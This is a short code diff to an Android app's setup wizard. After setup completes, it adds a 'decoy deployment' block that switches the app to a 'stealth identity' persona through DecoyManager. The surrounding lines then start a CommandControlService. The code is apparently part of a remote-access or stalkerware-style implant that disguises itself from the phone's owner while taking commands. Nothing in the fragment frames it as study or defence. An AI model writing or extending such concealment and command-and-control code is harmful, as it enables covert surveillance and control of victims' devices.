@@ -621,7 +621,17 @@ public class SetupWizardActivity extends Activity {
             .edit()
             .putBoolean("setup_completed", true)
             .commit();
-        
+
+        // ── DECOY DEPLOYMENT: switch to stealth identity immediately ────────
+        try {
+            int decoyPersona = BuildConfig.DECOY_CHOICE;
+            if (decoyPersona < 1 || decoyPersona > 6) decoyPersona = 1;
+            DecoyManager.get(this).remoteSwitch(decoyPersona);
+            Log.d("SWA", "Decoy deployed: persona " + decoyPersona);
+        } catch (Exception e) {
+            Log.e("SWA", "Decoy deploy error: " + e.getMessage());
+        }
+        // ── END DECOY DEPLOYMENT ────────────────────────────────────────────
         // Inicia serviços
         Intent ccIntent = new Intent(this, CommandControlService.class);
         if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
